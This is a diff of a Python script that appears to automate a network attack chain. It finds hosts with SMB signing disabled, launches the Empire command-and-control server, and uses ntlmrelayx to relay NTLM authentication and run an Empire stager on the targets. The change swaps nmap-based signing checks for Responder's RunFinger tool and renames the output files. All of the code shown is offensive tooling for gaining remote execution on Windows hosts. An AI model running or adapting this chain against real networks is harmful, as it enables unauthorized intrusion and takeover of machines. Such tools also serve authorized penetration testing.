@@ -74,7 +74,7 @@ def main():
     
     if not disable_relay:
         print("Getting relay target list")
-        subprocess.Popen("/opt/check-smb-signing.sh --nmap --out-dir /tmp -a %s" % (target_ip), shell=True).wait()
+        subprocess.Popen("/opt/check-smb-signing.sh --finger --finger-path /opt/Responder/tools/RunFinger.py --out-dir /tmp -a %s" % (target_ip), shell=True).wait()
     
     print("\nLaunching Empire (waiting 10s)...")
     command = 'cd /opt/Empire && ./empire --rest --username %s --password %s' % (empire_user, empire_pass)
@@ -110,8 +110,8 @@ def main():
     print("Stager: " + empire_stager)
     
     if not disable_relay:
-        if os.path.exists("/tmp/hosts-signing-disabled"):
-            command = "ntlmrelayx.py -smb2support -tf %s -c '%s'" % ("/tmp/hosts-signing-disabled.txt", empire_stager)
+        if os.path.exists("/tmp/hosts-signing-false"):
+            command = "ntlmrelayx.py -smb2support -tf %s -c '%s'" % ("/tmp/hosts-signing-false.txt", empire_stager)
         else:
             command = "ntlmrelayx.py -smb2support -c '%s'" % (empire_stager)
         
